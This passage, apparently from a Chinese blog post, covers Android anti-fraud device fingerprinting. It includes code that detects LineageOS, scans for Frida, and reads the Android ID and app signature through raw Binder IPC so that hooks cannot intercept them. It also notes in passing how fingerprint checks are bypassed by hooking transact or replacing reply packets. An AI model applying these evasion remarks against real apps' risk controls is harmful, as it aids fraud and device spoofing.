&#125;</span><br><span class="line">            return item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="检测Google-lineageos"><a href="#检测Google-lineageos" class="headerlink" title="检测Google&amp;lineageos"></a>检测Google&amp;lineageos</h3><p>因为在国内手机里基本<code>Google</code>和<code>lineageos</code>都是黑产的标配 ，大部分都是自己刷的ROM</p><p>这种手机理论上在国内 不应该出现，如果出现也会被打上标签，被认定为黑产 。可以直接Build.MODEL 获取厂商</p><p>另外这块还有一个细节点 ，就是<code>lineageos</code>一个特有文件<code>/system/addon.d</code> 。具体如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">private static void isLineageOs(ArrayList&lt;ListItemBean&gt; items) &#123;</span><br><span class="line">    //lineage检测</span><br><span class="line">    String display = NativeEngine.getZhenxiInfoH(&quot;ro.build.display.id&quot;);</span><br><span class="line">    if (display.toLowerCase(Locale.ROOT).contains(&quot;lineage&quot;)) &#123;</span><br><span class="line">        items.add(</span><br><span class="line">                new ListItemBean(&quot;当前手机为Lineage系统&quot;,</span><br><span class="line">                        ListItemBean.RiskLeave.Warn,</span><br><span class="line">                        &quot;可能存在自定义ROM,当前设备不可信！&quot;</span><br><span class="line">                ));</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    //lineage 特有文件</span><br><span class="line">    File file = new File(&quot;/system/addon.d&quot;);</span><br><span class="line">    if (file.exists()) &#123;</span><br><span class="line">        items.add(</span><br><span class="line">                new ListItemBean(&quot;当前手机为Lineage系统&quot;,</span><br><span class="line">                        ListItemBean.RiskLeave.Warn,</span><br><span class="line">                        &quot;可能存在自定义ROM,当前设备不可信！&quot;</span><br><span class="line">                ));</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然这块有一个细节点：</p><p>直接获取 <code>ro.build.display.id</code> 可能会被<code>Hook</code> ，所以这块我的建议是直接去解析配置文件</p><p>核心解析（&#x2F;dev&#x2F;<strong>properties</strong>&#x2F;u:object_r: ）文件方法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    public PropArea(String area) throws IOException &#123;</span><br><span class="line">        area = &quot;/dev/__properties__/u:object_r:&quot; + area + &quot;:s0&quot;;</span><br><span class="line">        File file = new File(area);</span><br><span class="line">        if (!file.isFile()) throw new FileNotFoundException(&quot;Not a file: &quot; + area);</span><br><span class="line">        long size = file.length();</span><br><span class="line">        if (size &lt;= 0 || size &gt;= 0x7fffffffL) throw new IllegalArgumentException(&quot;invalid file size &quot; + size);</span><br><span class="line"> </span><br><span class="line">        try (FileChannel channel = new FileInputStream(area).getChannel()) &#123;</span><br><span class="line">            data = channel.map(FileChannel.MapMode.READ_ONLY, 0, size).order(ByteOrder.nativeOrder());</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        byteUsed = data.getInt();</span><br><span class="line">        data.getInt(); // serial</span><br><span class="line">        int magic = data.getInt();</span><br><span class="line">        if (magic != PROP_AREA_MAGIC) throw new IllegalArgumentException(&quot;Bad file magic: &quot; + magic);</span><br><span class="line">        int version = data.getInt();</span><br><span class="line">        if (version != PROP_AREA_VERSION) throw new IllegalArgumentException(&quot;Bad area versin: &quot; + version);</span><br><span class="line">        data.position(data.position() + 28); // reserved</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">public List&lt;String&gt; findPossibleValues(String name) &#123;</span><br><span class="line">    List&lt;String&gt; values ;</span><br><span class="line">    try &#123;</span><br><span class="line">        //  atomic_uint_least32_t serial;</span><br><span class="line">        //  union &#123;</span><br><span class="line">        //    char value[PROP_VALUE_MAX];</span><br><span class="line">        //    struct &#123;</span><br><span class="line">        //      char error_message[kLongLegacyErrorBufferSize];</span><br><span class="line">        //      uint32_t offset;</span><br><span class="line">        //    &#125; long_property;</span><br><span class="line">        //  &#125;;</span><br><span class="line">        final int LONG_PROP_FLAG = 1 &lt;&lt; 16;</span><br><span class="line">        final int PROP_VALUE_MAX = 92;</span><br><span class="line">        final int VALUE_OFFSET = 4;</span><br><span class="line">        final int NAME_OFFSET = VALUE_OFFSET + 92;</span><br><span class="line">        values = new ArrayList&lt;&gt;(2);</span><br><span class="line">        findFromBuffer(data.slice(), name.getBytes(StandardCharsets.UTF_8), (buffer, offset) -&gt; &#123;</span><br><span class="line">            if (offset &lt; NAME_OFFSET) return;</span><br><span class="line">            int base = offset - NAME_OFFSET;</span><br><span class="line">            int serial = buffer.getInt(base);</span><br><span class="line">            if ((serial &amp; LONG_PROP_FLAG) != 0) return; // Long properties are not supported</span><br><span class="line">            values.add(toString(buffer, base + VALUE_OFFSET, PROP_VALUE_MAX));</span><br><span class="line">        &#125;);</span><br><span class="line">        CLog.i(&quot;Found &quot; + name + &quot;=&quot; + values);</span><br><span class="line">        return values;</span><br><span class="line">    &#125; catch (Throwable e) &#123;</span><br><span class="line">        CLog.e(&quot;findPossibleValues get error &quot;+ name+&quot; &quot;+e);</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="检测IDA和反调试："><a href="#检测IDA和反调试：" class="headerlink" title="检测IDA和反调试："></a>检测IDA和反调试：</h3><p>这块检测方法太多了，比如核心A和B方法里面加个时间戳，如果A执行到B大于5秒就可以认为被调试 。</p><p>检测调试状态也是很不错的选择，不过这块可以利用<code>ISO</code>线程去检测调试状态，防止被<code>ptrace</code></p><h4 id="service-list"><a href="#service-list" class="headerlink" title="service list"></a>service list</h4><p>也可以执行 “<code>service list</code>“ 获取服务列表 ，判断是否包含frida关键字 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">public static CheckServerRet checkServer(Context context, String[] fit) &#123;</span><br><span class="line">    CheckServerRet ret = new CheckServerRet();</span><br><span class="line">    ArrayList&lt;String&gt; list = ret.list;</span><br><span class="line">    BufferedReader reader = null;</span><br><span class="line">    Process process;</span><br><span class="line">    try &#123;</span><br><span class="line">        // 执行 service list 命令</span><br><span class="line">        process = Runtime.getRuntime().exec(&quot;service list&quot;);</span><br><span class="line"> </span><br><span class="line">        // 读取命令输出结果</span><br><span class="line">        reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">            if (line.length() &gt; 1) &#123;</span><br><span class="line">                for (String fitItem : fit) &#123;</span><br><span class="line">                    //比较不区分大小写</span><br><span class="line">                    if (line.toLowerCase().contains(fitItem.toLowerCase())) &#123;</span><br><span class="line">                        list.add(line);</span><br><span class="line">                        //CLog.e(&quot;checkServer find item is match &quot; + Arrays.toString(fit) + &quot; &quot; + line);</span><br><span class="line">                        break;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        //走到这里说明能拿到。返回的不是空</span><br><span class="line">                        ret.isSuccess = true;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        // 关闭流</span><br><span class="line">        reader.close();</span><br><span class="line"> </span><br><span class="line">        // 等待命令执行完毕</span><br><span class="line">        int exitValue = process.waitFor();</span><br><span class="line">        CLog.e(&quot;checkServer ret mark &quot; + Arrays.toString(fit) + &quot; &quot; + ret);</span><br><span class="line">        return ret;</span><br><span class="line">    &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        if (reader != null) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                reader.close();</span><br><span class="line">            &#125; catch (IOException ignored) &#123;</span><br><span class="line"> </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="设备指纹3"><a href="#设备指纹3" class="headerlink" title="设备指纹3"></a>设备指纹3</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="IPC代理-IPC协议是什么？"><a href="#IPC代理-IPC协议是什么？" class="headerlink" title="IPC代理&amp;IPC协议是什么？"></a>IPC代理&amp;IPC协议是什么？</h4><p>Android是基础的CS架构，客户端和服务端架构 。安卓为什么要这么设计呢？如果服务端和客户端在一个进程内，客户端崩溃了，服务端也会一起崩溃，导致整个系统不稳定 </p><p>安卓和Java相比多个一个Context，这个Context是调用安卓本身提供api的桥梁 ，里面有各种安卓系统提供的各种基础API</p><p>这些API可以直接操作Android系统 ，安卓本身通过各种各样的Manager去提供对应的Api去获取和修改 。比如<code>PackageManager，ActivityManager</code>等，这些Manager里面都会持有一个代理人 。当我们去调用这个Manager里面的一些Api的时候，一些简单的Api他会尝试去自己在本进程Native或者Java去实现，如果一些复杂的字段，比如查询系统的一些信息，或者调用一些系统关键函数，这种时候他会去调用“IPC代理人 ”，这个IPC代理人就是像服务端通讯的关键 。他相当于是向服务端的传话得人 ，代理设计模式 。对不同的Manager提供不一样的功能 ，而他传的话就是对应的IPC协议 。这个协议如何传递的，就是通过底层的共享内存<code>Binder</code>去实现的 。</p><p>而这个协议里面具体发送的内容，就是IPC协议装的“包裹”就是用的<code>Parcel</code> 。</p><p>这块举个栗子，当用户调用一个未初始化的<code>API</code>时候，需要跨进程通讯，到底发生了哪些动作</p><p><strong>用户调用系统API-&gt;Manager收到调用消息-&gt;判断是否需要调用服务端-&gt;调用IPC代理里面的方法-&gt;IPC代理构建发送的数据包调用Binder进行通讯数据写入以后返回</strong></p><p>这个IPC代理实现了Binder的接口，当前进程调用的最后一个API就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;android.os.BinderProxy&quot;-&gt;transact</span><br></pre></td></tr></table></figure><p>也就是说这个方法底层调用的是Binder的驱动，最终会去native层写入，剩下的就是开始运行服务端的逻辑了。把数据写入到transact方法的参数3里面。然后程序返回，下面是这个方法的原型</p><blockquote><p>之前通过hook binder来bypass指纹，有一个方法就是通过hook这个<code>transact</code>方法</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line">     * Perform a binder transaction on a proxy.</span><br><span class="line">     *</span><br><span class="line">     * @param code The action to perform.  This should</span><br><span class="line">     * be a number between &#123;@link #FIRST_CALL_TRANSACTION&#125; and</span><br><span class="line">     * &#123;@link #LAST_CALL_TRANSACTION&#125;.</span><br><span class="line">     * @param data Marshalled data to send to the target.  Must not be null.</span><br><span class="line">     * If you are not sending any data, you must create an empty Parcel</span><br><span class="line">     * that is given here.</span><br><span class="line">     * @param reply Marshalled data to be received from the target.  May be</span><br><span class="line">     * null if you are not interested in the return value.</span><br><span class="line">     * @param flags Additional operation flags.  Either 0 for a normal</span><br><span class="line">     * RPC, or &#123;@link #FLAG_ONEWAY&#125; for a one-way RPC.</span><br><span class="line">     *</span><br><span class="line">     * @return</span><br><span class="line">     * @throws RemoteException</span><br><span class="line">     */</span><br><span class="line">    public boolean transact(int code, Parcel data, Parcel reply, int flags) throws RemoteException &#123;</span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>第一个参数就是code，这个code指的是具体的<strong>事件类型</strong>，不同的事件传入的数字也不一样</p><p>第二参数是<strong>发送的数据包</strong>，这时候IPC已经往里面进行了写入对应的数据包 </p><p>第三个参数是reply，也就是<strong>服务端返回的保存内容</strong></p><p>注意：</p><blockquote><p><strong>这块可能存在一个问题，有的数据，这个时候你在after去覆写这个参数3已结晚了，因为数据在别的进程已结写入了 。</strong> <strong>如果你想对这个参数进行修改，最好的办法是直接模拟服务端手动往reply进行写入</strong></p></blockquote><p>第四个参数是flags，举个例子，比如你想获取正常的<code>PackageInfo</code>，不需要获取签名之类的信息，你传入0即可 </p><p>如果想获取签名就需要传入<code>PackageManager.GET_SIGNATURES</code>，这个flag相当于告诉服务端，都需要哪些功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getPackageManager().getPackageInfo(&quot;aaa&quot;,0);</span><br><span class="line">getPackageManager().getPackageInfo(&quot;aaa&quot;,PackageManager.GET_SIGNATURES);</span><br></pre></td></tr></table></figure><p>比如第一个Api获取到的<code>PackageInfo</code>里面是不包含签名信息的，第二个则包含 。当你需要什么功能的时候使用 “或” 连接即可。</p><blockquote><p>这块我们得到一个结论，这个方法是Java层通讯最后一个方法，也就是当前进程能操作的最后一个方法，剩下的就是服务端进程的事情了。这个方法是Java层的 <strong>“边界值 ”</strong>，这个边界值记住后面在总结里面会介绍到不同的边界值和风控的关系。</p></blockquote><blockquote><p>这块还有的大厂更恶心，他不走transact方法，因为transact方法底层走的就是Binder，<strong>可以直接在Native层调用的Binder 驱动，实现了transact 这个方法</strong> 。然后进行IPC通讯，直接不走Java层 。</p><p>当然他这种方法也是很不稳定，需要对每个android 版本都进行兼容，属于伤敌1000自损800类型 ，适配难度也很大。</p><p>随着安卓不断增强安全性，后面这种方式肯定会慢慢被PASS掉 ，现在利用跨进程在低版本越权App的太多了 。</p></blockquote><h4 id="动态代理IPC"><a href="#动态代理IPC" class="headerlink" title="动态代理IPC"></a>动态代理IPC</h4><p>就是我不用hook可以实现IPC的代理人替换么？</p><blockquote><p>这块有一个动态代理的知识点，就是他代理人本身是实现了一个接口，<strong>我们可以直接反射把他这个代理人给替换成我们的</strong>，然后我们使用<code>Proxy.newProxyInstance</code>动态代理这个接口类，也可以实现不需要Hook框架的情况下实现动态代理 。比如一些VA之类的用的就是这种，因为Hook其实稳定性啥的没有动态代理的稳定性好，Hook的话需要对不同版本兼容，一旦版本发生变化需要适配很多东西，而动态代理则不需要。</p><p>Hook的话痕迹可能更少一点，<strong>动态代理检测的话只需要反射这个IPC代理人，然后getClass().getName() 里面直接就有proxy之类的关键字</strong> ，各有各的好处</p></blockquote><h3 id="设备指纹-2"><a href="#设备指纹-2" class="headerlink" title="设备指纹"></a>设备指纹</h3><h4 id="IPCAndroid-Id"><a href="#IPCAndroid-Id" class="headerlink" title="IPCAndroid_Id"></a>IPCAndroid_Id</h4><h5 id="方法5："><a href="#方法5：" class="headerlink" title="方法5："></a>方法5：</h5><p>直接构建IPC协议和服务端进行通讯 ，这块<code>targetSdkVersion</code>必须升级到32以上</p><p>因为<code>getAttributionSource</code>这个玩意32版本以上好像才有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">public String getAndroidId5(Context context) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // Acquire the ContentProvider</span><br><span class="line">            Class&lt;?&gt; activityThreadClass = Class.forName(&quot;android.app.ActivityThread&quot;);</span><br><span class="line">            Method currentActivityThreadMethod = activityThreadClass.getMethod(&quot;currentActivityThread&quot;);</span><br><span class="line">            Object currentActivityThread = currentActivityThreadMethod.invoke(null);</span><br><span class="line">            // 通过ActivityThread获取一个指向远程&quot;settings&quot; ContentProvider的代理对象</span><br><span class="line">            Method acquireProviderMethod = activityThreadClass.getMethod(&quot;acquireProvider&quot;, Context.class, String.class, int.class, boolean.class);</span><br><span class="line">            Object provider = acquireProviderMethod.invoke(currentActivityThread, context, &quot;settings&quot;, 0, true);</span><br><span class="line"> </span><br><span class="line">            // 获取IContentProvider接口的Class对象，为后续获取Binder通信的“事务码”做准备</span><br><span class="line">            Class&lt;?&gt; iContentProviderClass = Class.forName(&quot;android.content.IContentProvider&quot;);</span><br><span class="line">            // ContentProvider的代理对象内部有一个名为mRemote的成员变量，它就是真正的Binder通信对象</span><br><span class="line">            Field mRemoteField = provider.getClass().getDeclaredField(&quot;mRemote&quot;);</span><br><span class="line">            mRemoteField.setAccessible(true);</span><br><span class="line">            IBinder binder = (IBinder) mRemoteField.get(provider);</span><br><span class="line"> </span><br><span class="line">            // Create the Parcel for the arguments</span><br><span class="line">            Parcel data = Parcel.obtain();</span><br><span class="line">            data.writeInterfaceToken(&quot;android.content.IContentProvider&quot;);</span><br><span class="line">            if (android.os.Build.VERSION.SDK_INT</span><br><span class="line">                    &gt;= android.os.Build.VERSION_CODES.S) &#123;</span><br><span class="line">                context.getAttributionSource().writeToParcel(data, 0); // 1. 写入归因源</span><br><span class="line">                data.writeString(&quot;settings&quot;);   // 2. 写入 authority</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); // 3. 写入方法名</span><br><span class="line">                data.writeString(&quot;android_id&quot;); // 4. 写入参数</span><br><span class="line">                data.writeBundle(Bundle.EMPTY); // 5. 写入额外Bundle</span><br><span class="line">            &#125; else if (android.os.Build.VERSION.SDK_INT</span><br><span class="line">                    == android.os.Build.VERSION_CODES.R) &#123;// API 30</span><br><span class="line">                //android 11</span><br><span class="line">                data.writeString(context.getPackageName());</span><br><span class="line">                data.writeString(null); //featureId</span><br><span class="line"> </span><br><span class="line">                data.writeString(&quot;settings&quot;); //authority</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); //method</span><br><span class="line">                data.writeString(&quot;android_id&quot;); //stringArg</span><br><span class="line">                data.writeBundle(Bundle.EMPTY);</span><br><span class="line">            &#125; else if (android.os.Build.VERSION.SDK_INT</span><br><span class="line">                    == android.os.Build.VERSION_CODES.Q) &#123; // API 29</span><br><span class="line">                //android 10</span><br><span class="line">                data.writeString(context.getPackageName());</span><br><span class="line"> </span><br><span class="line">                data.writeString(&quot;settings&quot;); //authority</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); //method</span><br><span class="line">                data.writeString(&quot;android_id&quot;); //stringArg</span><br><span class="line">                data.writeBundle(Bundle.EMPTY);</span><br><span class="line">            &#125; else &#123;                                // 更早版本</span><br><span class="line">                data.writeString(context.getPackageName());</span><br><span class="line">                data.writeString(&quot;GET_secure&quot;); //method</span><br><span class="line">                data.writeString(&quot;android_id&quot;); //stringArg</span><br><span class="line">                data.writeBundle(Bundle.EMPTY);</span><br><span class="line">            &#125;</span><br><span class="line"> </span><br><span class="line">            Parcel reply = Parcel.obtain();</span><br><span class="line">            // 调用transact向一个IBinder象(这里的binder变量是IBinder类)发送请求</span><br><span class="line">            binder.transact((int) iContentProviderClass.getDeclaredField(&quot;CALL_TRANSACTION&quot;).get(null), data, reply, 0);</span><br><span class="line">            reply.readException();</span><br><span class="line">            Bundle bundle = reply.readBundle();</span><br><span class="line">            reply.recycle();</span><br><span class="line">            data.recycle();</span><br><span class="line"> </span><br><span class="line">            return bundle.getString(&quot;value&quot;);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>分析：标准获取Android ID的标准、公开方法是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import android.provider.Settings;</span><br><span class="line"></span><br><span class="line">String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);</span><br></pre></td></tr></table></figure><p>这个标准方法内部其实也是通过 <code>ContentResolver</code> -&gt; <code>ContentProvider</code> 的机制，最终通过 Binder IPC 与系统服务（具体是 <code>SettingsProvider</code>）进行通信来获取值的。</p><blockquote><p>我们调用 <code>IBinder.transact()</code> 给一个 IBinder 对象发送请求，然后经过 Binder <code>Binder.onTransact()</code> 得到调用，接着远程操作的目标得到对应的调用</p></blockquote><h4 id="IPCAppSign"><a href="#IPCAppSign" class="headerlink" title="IPCAppSign"></a>IPCAppSign</h4><p>IPC获取签名也是一些大厂经常用检测签名的办法，修改的话也很简单，直接替换掉数据包即可</p><p>具体获取方法如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">public static int TRANSACTION_getPackageInfo() &#123;</span><br><span class="line">    if(TRANSACTION_getPackageInfo == -1) &#123;</span><br><span class="line">         try &#123;</span><br><span class="line">                Field field = null;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Class&lt;?&gt; pkmIPCClazz = Class.forName(&quot;android.content.pm.IPackageManager$Stub&quot;);</span><br><span class="line">                    field = pkmIPCClazz.getDeclaredField(&quot;TRANSACTION_getPackageInfo&quot;);</span><br><span class="line">                &#125; catch (Throwable e) &#123;</span><br><span class="line">                    CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; getTranscationId forName error &quot; + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">                assert field != null;</span><br><span class="line">                field.setAccessible(true);</span><br><span class="line">                TRANSACTION_getPackageInfo = field.getInt(null);</span><br><span class="line">            &#125; catch (Throwable e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                CLog.e(&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; getTranscationId error &quot; + e.getMessage());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return TRANSACTION_getPackageInfo;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">try &#123;</span><br><span class="line">    PackageManager packageManager = getBaseContext().getPackageManager();</span><br><span class="line"></span><br><span class="line">    // 1. 获取底层的 IPackageManager 代理对象</span><br><span class="line">    Object IPC_PM_Obj = RposedHelpers.getObjectField(packageManager, &quot;mPM&quot;);</span><br><span class="line">    // 2. 从代理对象中获取真正的 IBinder 对象</span><br><span class="line">    IBinder mRemote = (IBinder) RposedHelpers.getObjectField(IPC_PM_Obj, &quot;mRemote&quot;);</span><br><span class="line"></span><br><span class="line">    // 3. 准备数据 Parcel 和回复 Parcel</span><br><span class="line">    Parcel _data = Parcel.obtain();</span><br><span class="line">    Parcel _reply = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">    // 4. 按照 AIDL 协定，手动打包参数到 _data 中</span><br><span class="line">    _data.writeInterfaceToken(&quot;android.content.pm.IPackageManager&quot;); // 写入接口令牌，用于验证</span><br><span class="line">    _data.writeString(getPackageName()); // 参数1: packageName (String)</span><br><span class="line">    _data.writeLong(PackageManager.GET_SIGNATURES); // 参数2: flags (long), 注意这里用了writeLong</span><br><span class="line">    _data.writeInt(android.os.Process.myUid()); // 参数3: userId (int)</span><br><span class="line"></span><br><span class="line">    // 5. 发起远程调用</span><br><span class="line">    boolean _status = mRemote.transact(TransactCase.TRANSACTION_getPackageInfo(), _data, _reply, 0);</span><br><span class="line">    _reply.readException(); // 检查远程调用是否发生异常</span><br><span class="line"></span><br><span class="line">    // 6. 从 _reply 中解包返回值</span><br><span class="line">    PackageInfo packageInfo = _reply.readTypedObject(PackageInfo.CREATOR);</span><br><span class="line"></span><br><span class="line">    // 7. 回收 Parcel 对象</span><br><span class="line">    _data.recycle();</span><br><span class="line">    _reply.recycle();</span><br><span class="line">    CLog.e(&quot;签名信息: &quot;+packageInfo.signatures[0].toCharsString());</span><br><span class="line">&#125; catch (Throwable e) &#123;</span><br><span class="line">    CLog.i(&quot;IPC_TEST_getPackageInfo error &quot;+e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>绕过高层 API Hook，直接通过底层 Binder IPC (进程间通信) 来获取应用签名信息</strong></p><p><strong>什么是 Transaction Code?</strong> </p><p>在 Android 的 Binder IPC 机制中，客户端（App）调用服务端（System Service）的方法时，并不是直接传递方法名。为了效率，每个方法都被映射到一个唯一的整数ID，这个ID就叫做 <code>Transaction Code</code>。当客户端发起 <code>transact</code> 调用时，它会把这个整数ID和参数一起打包发送给服务端，服务端根据这个ID就知道要调用哪个具体的方法。</p><p><strong>为什么要用反射获取？</strong></p><p><code>TRANSACTION_getPackageInfo</code> 是 <code>IPackageManager.aidl</code> 文件在编译后自动生成的 <code>IPackageManager$Stub</code> 类中的一个私有静态常量。它的值在不同 Android 